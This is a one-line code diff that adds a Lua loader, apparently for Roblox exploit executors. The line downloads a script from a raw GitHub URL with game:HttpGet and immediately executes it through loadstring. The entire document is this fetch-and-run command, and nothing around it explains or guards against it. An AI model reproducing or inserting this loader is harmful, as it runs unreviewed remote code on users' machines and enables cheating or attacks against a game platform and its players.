@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/insanecontenty2k-blip/scriptss/main/universalscriptsofop"))()
